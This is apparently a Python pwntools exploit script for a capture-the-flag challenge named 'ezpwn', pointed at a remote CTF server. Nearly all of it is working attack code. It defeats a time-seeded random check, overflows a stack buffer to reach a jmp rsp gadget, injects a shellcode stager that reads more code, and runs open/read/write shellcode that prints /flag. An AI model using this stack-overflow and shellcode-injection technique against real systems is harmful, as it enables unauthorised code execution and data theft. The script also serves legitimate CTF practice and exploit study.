# import time
from pwn import *
# from LibcSearcher import *
# from ctypes import *
# from struct import pack
# from ae64 import AE64

# io = remote("192.168.170.128", 1234)
io = remote("node5.anna.nssctf.cn", 28250)
# io = remote("192.168.170.128", 9999)
# io = process('./ezpwn')
# gdb.attach(io)
# io = remote("dasctf_sixbytes.node.game.sycsec.com", 30774)
# context.arch = "amd64"

# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node4.buuoj.cn", 25007)
# io = remote("112.6.51.212", 30362)
# io = remote("8.130.35.16", 51003)
# context(os='linux', arch = 'amd64', log_level = "debug")
# elf = ELF('./dasctf_sixbytes')
# libc = ELF('./libc-2.31.so')


def s(a):
    io.send(a)
def sa(a, b):
    io.sendafter(a, b)
def sl(a):
    io.sendline(a)
def sal(a, b):
    io.sendlineafter(a, b)
def r(n):
    return (io.recv(n))
def ru(a):
    return io.recvuntil(a)
def rl():
    return io.recvline()
def sla(a, b):
    io.sendlineafter(a, b)
def debug():
    gdb.attach(io)
    pause()
def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
def inter():
    return io.interactive()
def print_addr(name, addr):
    print(f"{name} =", addr)
def operater(optr, opnd1, opnd2):
    optr_str_list = ['×', '**', '+', '-', '÷', '%']
    if optr in optr_str_list:
        index = optr_str_list.index(optr)
    if optr == optr_str_list[0]:  # 乘法
        result = opnd1 * opnd2
    elif optr == optr_str_list[1]:  # 幂运算
        result = opnd1 ** opnd2
    elif optr == optr_str_list[2]:  # 加法
        result = opnd1 + opnd2
    elif optr == optr_str_list[3]:  # 减法
        result = opnd1 - opnd2
    elif optr == optr_str_list[4]:  # 除法
        if opnd2 != 0:  # 避免除以零错误
            result = opnd1 / opnd2
        else:
            result = "Error: Division by zero"
    elif optr == optr_str_list[5]:  # 取余
        if opnd2 != 0:  # 避免取余时除数为零
            result = opnd1 % opnd2
        else:
            result = "Error: Modulo by zero"
    else:
        result = "Eddddddrror: Invalid operator"

    return result


# context(os='linux', arch='amd64')
context(os='linux', arch='amd64', log_level="debug")

from ctypes import *
libc = cdll.LoadLibrary("./libc.so.6")
libc.srand(libc.time(0))
random = libc.rand() % 50
print(hex(random))

sla(b'num:', str(random))
ru(b'door')
sub_jmp = asm("""
    sub rsp, 0x30
    jmp rsp
""")

jmp_rsp = 0x40094E

read_code = '''
            mov r14, r13
            mov r15, r13
                /* r13 -> rsp */
            xor rdi, rdi
                /* ARG0 -> rdi -> fd */
            push r14
            pop rsi
                /* ARG1 -> rsi = r13 = rsp */
            push 0x100
            pop rdx
                /* ARG2 -> rdx = 0x100 */
            xor rax, rax
            syscall
                /* read(0, rsp, 0x100) */
            push r15
            pop rsp
            jmp rsp
'''

payload1 = asm(read_code).ljust(0x28, b'\x00') + p64(jmp_rsp) + sub_jmp
sl(payload1)
orw_code  = shellcraft.open('/flag')
orw_code += shellcraft.read(3, 0x601f00, 0x30)
orw_code += shellcraft.write(1, 0x601f00, 0x30)
payload2 = asm(orw_code)
sl(payload2)
inter()

